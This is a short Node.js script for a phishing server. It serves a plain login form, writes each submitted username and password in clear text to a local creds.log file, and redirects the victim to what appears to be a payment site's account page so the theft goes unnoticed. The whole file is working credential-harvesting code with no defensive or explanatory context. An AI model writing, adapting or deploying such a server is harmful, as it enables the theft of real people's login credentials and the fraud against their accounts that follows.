const http = require('http');
const fs = require('fs');
const querystring = require('querystring');
http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/login') {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => {
      const data = querystring.parse(body);
      const creds = `User: ${data.username} Pass: ${data.password}\n`;
      fs.appendFile('creds.log', creds, err => {});
      res.writeHead(302, { Location: 'https://payquick.com/account' });
      res.end();
    });
  } else {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<html><body><form method="POST" action="/login"><input name="username"/><input name="password" type="password"/><button>Login</button></form></body></html>');
  }
}).listen(80);

